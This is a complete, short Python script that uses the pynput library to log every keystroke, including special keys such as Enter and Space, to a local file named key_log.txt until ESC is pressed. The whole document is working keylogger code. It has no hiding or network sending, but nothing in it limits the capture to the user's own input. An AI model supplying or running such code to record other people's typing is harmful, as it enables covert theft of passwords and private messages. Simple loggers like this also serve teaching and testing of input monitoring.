from pynput import keyboard

log_file = "key_log.txt"   # Saved in current directory

def on_press(key):
    try:
        with open(log_file, "a") as f:
            f.write(str(key.char))
    except AttributeError:
        with open(log_file, "a") as f:
            f.write(f"[{key.name}]")  # e.g., [ENTER], [SPACE]

def on_release(key):
    if key == keyboard.Key.esc:  # Press ESC to stop logging
        return False

# Start the listener
with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
